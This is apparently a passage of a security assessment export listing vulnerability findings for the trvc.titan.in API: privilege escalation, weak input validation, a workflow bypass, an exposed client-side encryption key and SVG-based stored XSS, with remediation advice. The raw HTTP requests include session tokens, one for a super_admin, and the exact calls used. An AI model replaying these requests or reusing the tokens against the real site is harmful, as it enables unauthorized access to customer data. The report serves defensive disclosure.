+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Wed, 30 Sep 2026 12:27:08 GMT
+Content-Length: 347",https://trvc.titan.in/api/users,https://trvc.titan.in/api/users,"An attacker who obtains or guesses a user's weak password may be able to gain unauthorized access to the associated account. If the compromised account has elevated privileges, this could further allow unauthorized access to sensitive application functionality and data."
+7,5589179,Privilege Escalation,30-09-2026 05:30,30-09-2026 05:30,NEW,High,https://trvc.titan.in/api/customers,It was observed that an Optometrist user can create and delete customer records and access customer and user PII beyond the intended role permissions.,"Privilege escalation means a user receives privileges, he is not entitled to. These privileges can be used to delete files, view private information, or install unwanted programs, such as viruses. It usually occurs when a system has a bug that allows security to be bypassed, or alternatively, has flawed design assumptions about how it will be used","Implement server side mapping of user to accessibility. The features applicable to different privilege levels should to accessible strictly to those level users only. Any other user should not be granted access to it. Implement access control matrix.
+Implement strict server-side Role-Based Access Control (RBAC) for all customer and user-management APIs.
+Restrict customer creation and deletion to authorized roles and assigned stores.
+Ensure Optometrist users can access only the customer records required for their role and assigned store.
+Restrict access to prescription information and other sensitive PII based on business need.
+Prevent users from modifying API parameters to access records belonging to other stores or roles.
+Apply authorization checks to every API request rather than relying on frontend restrictions.
+Review and remove excessive permissions from the Optometrist and Senior Optometrist roles.
+Log and monitor sensitive operations such as customer creation, deletion, and PII access.
+Note: Implement the provided mitigation through the application and verify the authorization controls across all affected APIs.",,8.1,AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H,"Permissions, Privileges, and Access Controls",A07:2025 - Authentication Failures,"GET /api/customers HTTP/2
+Host: trvc.titan.in
+Cookie: _ga=GA1.1.1530676766.1790233806; _ga_EENZGKTHN6=GS2.1.s1790242182$o3$g1$t1790242195$j47$l0$h0; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRjb3JAZ21haWwuY29tIiwibmFtZSI6IlRDT1IiLCJyb2xlIjoic3RvcmUiLCJzdG9yZU5hbWUiOiJUQ09SIiwiZXhwIjoxNzkzMzQzMzcxMTU5fQ.8KwmQxK-zFYrOIs_2qfOcxZ7viWqMy6gO_xpYJuv9wA
+Sec-Ch-Ua-Platform: ""Windows""
+X-E2ee-Client: true
+Accept: application/json, text/plain, */*
+Sec-Ch-Ua: ""Chromium"";v=""151"", ""Not=A?Brand"";v=""99""
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://trvc.titan.in/store
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i","HTTP/2 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: application/json; charset=utf-8
+Expires: 0
+Etag: W/""64df-TSl5l4kMuPpbKDxUFLcDlVkAW2c""
+Vary: Origin
+X-Request-Id: dd86c67d-da15-46e0-a1b9-f559cff31c47
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 1000;w=60
+Ratelimit-Limit: 1000
+Ratelimit-Remaining: 999
+Ratelimit-Reset: 60
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Wed, 30 Sep 2026 07:45:00 GMT
+Content-Length: 25823",https://trvc.titan.in/api/customers,https://trvc.titan.in/api/customers,"An attacker with a compromised Optometrist account could create unauthorized patient records, delete existing customer records, and access sensitive customer information such as PII and prescription-related data. The ability to access PII of users across different roles could further expose sensitive information belonging to Store, Optometrist, Senior Optometrist, and Super Admin users, resulting in unauthorized data disclosure and potential data integrity issues."
+8,5589176,User Input With Special Character,30-09-2026 05:30,30-09-2026 05:30,NEW,Low,https://trvc.titan.in/api/customers/%230007/feedback-image/1,It was observed that the application accepts and stores arbitrary special characters and HTML/script-related characters in input fields without proper input validation.,Application allows user to enter special character in input fields.,"Implement server side validation ensuring that only expected data is accepted by the application.
+Implement server-side input validation for all user-controlled fields.
+Allow only characters that are required for the specific field.
+Properly encode user-controlled data before displaying it in HTML.
+Apply context-aware output encoding rather than relying only on client-side validation.
+Validate and sanitize input on the server side before storing or processing it.
+Review other application input fields for similar insufficient validation.",,3.1,AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N,Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'),A02:2025 - Security Misconfiguration,"POST /api/customers/%230007/feedback-image/1 HTTP/1.1
+Host: trvc.titan.in
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InN0b3JlQGdtYWlsLmNvbSIsIm5hbWUiOiJUQ09SIiwicm9sZSI6InN0b3JlIiwic3RvcmVOYW1lIjoiVENPUiIsImV4cCI6MTc5MzE4NjQ1NTAzNX0.sHbjYigncktnJ2Qv12kgtr4UU-Dd8PeODUSN13K3UR0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://trvc.titan.in/store
+X-E2ee-Client: true
+Content-Type: multipart/form-data; boundary=----geckoformboundary1b0d08861b4a114fc8e638a1ada13a9c
+Content-Length: 339
+Origin: https://trvc.titan.in
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: keep-alive
+
+------geckoformboundary1b0d08861b4a114fc8e638a1ada13a9c
+Content-Disposition: form-data; name=""image""; filename=""Tester.svg""
+Content-Type: image/svg+xml","HTTP/2 201 Created
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: application/json; charset=utf-8
+Expires: 0
+Etag: W/""7cb-WPfxTeFl6hXyt6moc+Oi6qZcxQ4""
+Vary: Origin
+X-Request-Id: 16a40f86-7917-4e8f-a8dd-289b9645578f
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Origin: https://trvc.titan.in
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 1000;w=60
+Ratelimit-Limit: 1000
+Ratelimit-Remaining: 990
+Ratelimit-Reset: 2
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Mon, 28 Sep 2026 12:19:12 GMT
+Content-Length: 1995",https://trvc.titan.in/api/customers/%230007/feedback-image/1,https://trvc.titan.in/api/customers/%230007/feedback-image/1,"An attacker may submit unexpected or maliciously crafted input containing special characters that could affect application processing, data integrity, or output handling. If the same input is later rendered in an unsafe context, it may also increase the risk of HTML or script injection vulnerabilities."
+9,5589173,Business Logic Flaw,30-09-2026 05:30,30-09-2026 05:30,NEW,High,https://trvc.titan.in/api/customers/%230008/initiate-call,It was observed that the Optometrist role can directly initiate customer calls through the API without following the intended Store-controlled workflow.,"Business logic flaws occur when an application's intended flow can be manipulated to bypass rules or processes, leading to unauthorized actions or abuse. These flaws stem from inadequate design, allowing attackers to exploit logical conditions, user workflows, or transactional processes in ways that developers did not anticipate, often leading to significant business or security impacts.","Design applications with strict and validated workflows. Implement server-side enforcement of all critical processes and logic checks. Perform regular threat modelling and business logic testing to identify and mitigate logic gaps early. Secure critical operations with layered controls such as authorization checks, rate limiting, and anomaly detection.
+Enforce the intended workflow on the server side rather than relying only on frontend controls.
+Verify that only authorized Store users can initiate customer calls.
+Validate the customer's current workflow state before processing the call-initiation API request.
+Ensure an Optometrist cannot directly invoke the call-initiation operation.
+Implement server-side role and permission checks for all workflow-sensitive API endpoints.
+Reject requests that do not follow the required sequence of business operations.",,8.1,AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N,,A06:2025 - Insecure Design,"POST /api/customers/%230008/initiate-call HTTP/2
+Host: trvc.titan.in
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFudXNoYUBnbWFpbC5jb20iLCJuYW1lIjoiQW51c2hhIiwicm9sZSI6Im9wdG9tZXRyaXN0IiwiZXhwIjoxNzkzMzUxNTA5MjYyfQ.SdNFRZUSIWKGWT3UULtesM1D5W9mfh_bLPPxUjumc5U
+Content-Length: 2
+","HTTP/2 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: application/json; charset=utf-8
+Expires: 0
+Etag: W/""56b-FQWGAqcbp2b6cQ1ucjjp7F0r3EI""
+Vary: Origin
+X-Request-Id: 5e0b3acd-61c3-466a-bfd3-094a5dc92fa3
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 1000;w=60
+Ratelimit-Limit: 1000
+Ratelimit-Remaining: 998
+Ratelimit-Reset: 44
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Wed, 30 Sep 2026 09:20:57 GMT
+Content-Length: 1387",https://trvc.titan.in/api/customers/%230008/initiate-call,https://trvc.titan.in/api/customers/%230008/initiate-call,"An attacker with access to an Optometrist account could bypass the intended business workflow and directly initiate calls for customers. This may allow unauthorized actions to be performed outside the application's defined process and could affect workflow integrity, customer interactions, and business operations."
+10,5589159,Encryption Decryption Attack,30-09-2026 05:30,30-09-2026 05:30,NEW,Critical,https://trvc.titan.in/api/login,"It was observed that the application exposes the encryption secret in the client-side JavaScript bundle, allowing an attacker to decrypt captured encrypted requests/responses and generate modified encrypted requests.","Encryption is a crucial security measure used to protect sensitive information by converting it into an unreadable format, which can only be reverted to its original form using a specific key and initialization vector (IV). When these cryptographic keys are improperly managed, such as being hardcoded into the application or configuration files, they become vulnerable to exposure and misuse.
+
+Risk
+• Data Exposure: The hardcoded private key and exposed decryption logic enable unauthorized access to sensitive data, leading to potential data breaches.
+• Security Compromise: Attackers exploiting these vulnerabilities can decrypt and access protected information, compromising the confidentiality of user data.
+• Underlying Vulnerability Exploitation: Successful decryption facilitates the exploitation of additional vulnerabilities discovered, intensifying the impact of the attack.
+• Reputation Damage: Data breaches and security compromises harm the organization's reputation, eroding trust among users and stakeholders.","Never hardcode cryptographic keys or IVs in the source code or configuration files.
+IVs should be unique and unpredictable for each encryption operation. Typically, this can be achieved by using a secure random number generator.
+IVs can be stored alongside the ciphertext, as they do not need to be kept secret but should never be reused with the same key.
+Do not embed encryption keys, secrets, or other sensitive cryptographic material in client-side JavaScript.
+Perform encryption and decryption of sensitive application data on the server side using securely stored server-side keys.
+Store cryptographic keys in a secure key-management system or secrets manager rather than source code or frontend bundles.
+Implement proper server-side authentication and authorization for every sensitive API operation.
+Do not rely on client-side encryption as a security boundary.
+Rotate the exposed encryption key immediately and invalidate any previously generated encrypted tokens/data where applicable.
+Review application logs and source code for other exposed secrets or hardcoded credentials.
+Note: Implement the provided mitigation through the application and ensure the encryption key is no longer accessible to unauthorized clients.",,9.8,AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,Cryptographic Issues,A04:2025 - Cryptographic Failures,"POST /api/login HTTP/2
+Host: trvc.titan.in
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://trvc.titan.in/login
+Content-Type: application/json
+X-E2ee-Client: true
+Origin: https://trvc.titan.in
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Content-Length: 211
+","HTTP/2 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: application/json; charset=utf-8
+Expires: 0
+Etag: W/""ef-QIyYn8qKO7Cg4a2nSaJQ7Wp0pbY""
+Vary: Origin
+Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGdtYWlsLmNvbSIsIm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6MTc5MzE4NjI3OTc2M30.qIPTGy8saFZI50giVzSuSGozqp22ikMT_ufqmh7QK5Q; Path=/; HttpOnly; Secure; SameSite=Strict
+X-Request-Id: 1dd3f0b8-4ae0-4e8c-b6a7-4b10e38a0c58
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Origin: https://trvc.titan.in
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 20;w=900
+Ratelimit-Limit: 20
+Ratelimit-Remaining: 19
+Ratelimit-Reset: 900
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Mon, 28 Sep 2026 11:17:59 GMT
+Content-Length: 239",https://trvc.titan.in/api/login,https://trvc.titan.in/api/login,"An attacker who obtains the exposed encryption secret can decrypt sensitive application traffic, including authentication data, and create valid encrypted requests with attacker-controlled values. During testing, the captured login request was successfully decrypted to reveal the submitted credentials, and the encrypted request could be processed using the exposed key. This may allow unauthorized access, manipulation of sensitive application transactions, and potential compromise of privileged accounts and application data."
+11,5588639,Cross-Site Scripting (XSS),29-09-2026 05:30,29-09-2026 05:30,NEW,High,https://trvc.titan.in/api/customers/%230007/feedback-image/1,"It was observed that the application allows a malicious SVG file containing JavaScript to be uploaded and stored, resulting in JavaScript execution when the uploaded file is accessed.","The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
+ Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
+ 
+This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
+ which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.
+
+This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.
+
+An attacker can do the following damage with an exploit script:
+
+<ul>
+<li>access other sites inside another client's private intranet</li>
+<li>steal another client's cookie(s)</li>
+<li>modify another client's cookie(s)</li>
+<li>steal another client's submitted form data</li>
+<li>modify another client's submitted form data before it reaches the server</li>
+<li>submit a form to your Web application on the user's behalf that modifies passwords or other application data</li></ul>
+
+
+
+The two most common methods of attack are:
+
+<ul>
+<li>Having a user click a URL link sent in an e-mail</li>
+<li>Having a user click  a URL link while visiting a Web site</li></ul>
+
+
+In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
+ trigger the XSS attack.
+
+Note that SSL connectivity does not protect against this issue.
+
+Stored Cross-Site Scripting occurs when an application stores user-controlled content and later renders it in a web browser without properly sanitizing or encoding it. In this case, an SVG file containing a JavaScript payload was uploaded through the file upload functionality. The uploaded SVG was accessible through the application and rendered by the browser, causing the embedded JavaScript to execute.","Fix Cross Site Scripting Vulnerability
+
+Restrict uploads to required image formats and block SVG files if they are not required.
+Validate the file extension, MIME type, and actual file content server-side.
+Sanitize SVG files and remove scripts, event handlers, embedded HTML, and other active content.
+Store uploaded files outside the application's executable/web content directory.
+Serve uploaded files with safe Content-Type and Content-Disposition headers.
+Consider serving uploaded files from a separate domain/origin.
+Implement a restrictive Content Security Policy as an additional security control.
+Audit the affected url and other similar dynamic pages or scripts that could
+      be relaying untrusted malicious data from the user input. In general, the
+      following practices should be followed while developing dynamic web content:
+<ul>
+<li>Explicitly set the character set encoding for each page generated by the web server</li>
+<li>Identify special characters</li>
+<li>Encode dynamic output elements</li>
+<li>Filter specific characters in dynamic elements</li>
+<li>Examine cookies</li></ul>
+ For more information on the above practices, read the following CERT advisory:
+         
+<a href=""http://www.cert.org/tech_tips/malicious_code_mitigation.html"">CERT Advisory CA-2000-02</a>
+
+<ul>
+<li>
+For ASP.NET applications, the validateRequest attribute can be added
+      to the page or the web.config. For example:
+<pre>
+        <%@ Page ... validateRequest=""true"" %>
+
+        OR
+
+        <system.web>
+         <pages validateRequest=""true"" />
+        </system.web>
+      </pre>
+In addition, all dynamic content should be HTML encoded using HTTPUtility.HTMLEncode.</li>
+<li>
+For PHP applications, input data should be validated using functions such as
+      strip_tags and utf8_decode. Dynamic content should be HTML encoded using HTML entities.</li>
+<li>
+For Perl applications, input data should be validated whenever possible using
+      regular expressions. Dynamic content should be HTML encoded using HTML::Entities::encode
+      or Apache::Util::html_encode (when using mod_perl).</li></ul>
+
+",,8.7,AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N,Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),A05:2025 - Injection,"POST /api/customers/%230007/feedback-image/1 HTTP/1.1
+Host: trvc.titan.in
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InN0b3JlQGdtYWlsLmNvbSIsIm5hbWUiOiJUQ09SIiwicm9sZSI6InN0b3JlIiwic3RvcmVOYW1lIjoiVENPUiIsImV4cCI6MTc5MzE4NjQ1NTAzNX0.sHbjYigncktnJ2Qv12kgtr4UU-Dd8PeODUSN13K3UR0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://trvc.titan.in/store
+X-E2ee-Client: true
+Content-Type: multipart/form-data; boundary=----geckoformboundary1b0d08861b4a114fc8e638a1ada13a9c
+Content-Length: 339
+Origin: https://trvc.titan.in
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: keep-alive","HTTP/2 201 Created
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: application/json; charset=utf-8
+Expires: 0
+Etag: W/""7cb-WPfxTeFl6hXyt6moc+Oi6qZcxQ4""
+Vary: Origin
+X-Request-Id: 16a40f86-7917-4e8f-a8dd-289b9645578f
